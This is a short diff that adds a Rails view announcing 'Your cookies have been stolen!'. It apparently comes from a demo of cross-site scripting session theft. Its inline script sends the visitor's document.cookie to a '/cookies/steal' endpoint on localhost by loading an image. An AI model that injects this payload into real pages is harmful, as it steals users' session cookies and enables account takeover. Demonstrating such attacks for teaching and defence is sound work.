@@ -1,0 +1,11 @@
+<h1>Your cookies have been stolen!</h1>
+
+<div class="some"></div>
+
+<p><%= link_to "Back", root_path %></p>
+
+<script>
+	var img = document.createElement("img");
+	img.src = "http://localhost:3000/cookies/steal?cookies=" + document.cookie;
+	$('.some').append(img);
+</script>
